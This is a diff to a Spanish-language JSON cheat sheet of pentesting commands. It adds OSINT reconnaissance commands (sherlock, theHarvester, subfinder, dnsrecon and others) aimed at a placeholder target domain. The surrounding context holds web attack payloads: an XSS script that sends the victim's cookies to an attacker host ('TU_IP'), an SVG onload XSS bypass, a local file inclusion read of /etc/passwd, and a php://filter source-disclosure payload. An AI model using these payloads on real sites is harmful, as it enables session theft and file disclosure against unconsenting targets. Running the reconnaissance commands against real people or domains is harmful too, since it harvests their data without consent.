@@ -10,6 +10,36 @@
     {"titulo": "Robo de Cookies", "cmd": "<script>document.location='http://TU_IP/log.php?c='+document.cookie</script>"},
     {"titulo": "Bypass con SVG", "cmd": "<svg onload=alert(1)>"}
   ],
+  "osint_recon": [
+    {
+      "titulo": "Sherlock: Buscar nombre de usuario en redes sociales",
+      "cmd": "sherlock nombre_usuario"
+    },
+    {
+      "titulo": "TheHarvester: Recolección de emails y subdominios",
+      "cmd": "theHarvester -d objetivo.com -l 500 -b google"
+    },
+    {
+      "titulo": "Whois: Información de registro de dominio",
+      "cmd": "whois objetivo.com"
+    },
+    {
+      "titulo": "Exiftool: Extraer metadatos de una imagen",
+      "cmd": "exiftool imagen.jpg"
+    },
+    {
+      "titulo": "Subfinder: Descubrimiento rápido de subdominios",
+      "cmd": "subfinder -d objetivo.com"
+    },
+    {
+      "titulo": "Dimitry: Escaneo integral de info (Deepmagic Information Gatherer)",
+      "cmd": "dimitry -iwnse objetivo.com"
+    },
+    {
+      "titulo": "DNSrecon: Enumeración de registros DNS",
+      "cmd": "dnsrecon -d objetivo.com"
+    }
+  ],
   "lfi_rfi": [
     {"titulo": "Leer /etc/passwd", "cmd": "/etc/passwd"},
     {"titulo": "PHP Filter (Base64)", "cmd": "php://filter/convert.base64-encode/resource=index.php"},
